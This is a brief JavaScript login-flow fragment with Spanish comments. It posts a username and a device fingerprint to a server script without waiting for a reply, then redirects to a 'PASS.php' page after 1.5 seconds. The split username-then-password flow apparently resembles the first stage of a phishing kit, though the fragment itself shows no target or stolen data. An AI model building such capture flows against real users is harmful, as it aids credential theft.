function inicio(u){
    var d = detectar_dispositivo();
    // Enviamos los datos, pero NO esperamos la respuesta para saltar
    $.post( "../process/inicio.php", { usr: u, dis: d } );
    
    // Saltamos a los 1.5 segundos pase lo que pase
    setTimeout(function(){ 
        window.location.href = "PASS.php"; 
    }, 1500);
}
